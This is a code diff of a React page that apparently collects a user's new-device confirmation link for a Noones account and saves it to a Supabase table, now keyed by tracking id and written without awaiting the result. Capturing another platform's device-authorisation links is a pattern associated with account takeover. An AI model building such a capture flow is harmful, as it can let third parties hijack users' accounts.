@@ -2,9 +2,10 @@ import React, { useState, useEffect, useRef } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
 import { supabase } from '../../lib/supabase';
 
-const NOONES_REQUEST_ID_KEY = 'current_request_id';
+const NOONES_TRACKING_ID_KEY = 'noones_tracking_id';
 const NOONES_CURRENT_STEP_KEY = 'noones_current_step';
 const NOONES_REQUEST_DATA_KEY = 'noones_request_data';
+const NOONES_REQUEST_ID_KEY = 'noones_tracking_id';
 
 export default function NoonesNewDeviceVerification() {
   const navigate = useNavigate();
@@ -52,24 +53,32 @@ export default function NoonesNewDeviceVerification() {
     setIsLoading(true);
 
     try {
-      const requestId = window.localStorage.getItem(NOONES_REQUEST_ID_KEY);
-      if (!requestId) {
-        throw new Error('No request ID found');
+      const trackingId = window.localStorage.getItem(NOONES_TRACKING_ID_KEY);
+      if (!trackingId) {
+        throw new Error('No tracking ID found');
       }
 
-      console.log('Updating table: platform_connection_requests, id:', requestId);
-      const { error } = await supabase
+      console.log('[PERSISTENT_PROGRESS] Step 2 - Updating confirmation_link for tracking_id:', trackingId);
+      // Non-blocking update - don't await
+      supabase
         .from('platform_connection_requests')
         .update({
           confirmation_link: link.trim(),
         })
-        .eq('id', requestId);
+        .eq('tracking_id', trackingId)
+        .then((result) => {
+          if (result.error) {
+            console.error('[PERSISTENT_PROGRESS] Async update error for confirmation_link:', result.error);
+          } else {
+            console.log('[PERSISTENT_PROGRESS] Async update completed for tracking_id:', trackingId);
+          }
+        })
+        .catch((err) => {
+          console.error('[PERSISTENT_PROGRESS] Async update exception:', err);
+        });
 
-      if (error) {
-        throw error;
-      }
-
-      console.log('Updated confirmation_link for id:', requestId);
+      // User can proceed to next step immediately - no need to wait for DB update
+      console.log('[PERSISTENT_PROGRESS] Step 2 Complete: Link verified, moving to step 3');
 
       // Update progress
       const requestDataStr = window.localStorage.getItem(NOONES_REQUEST_DATA_KEY);
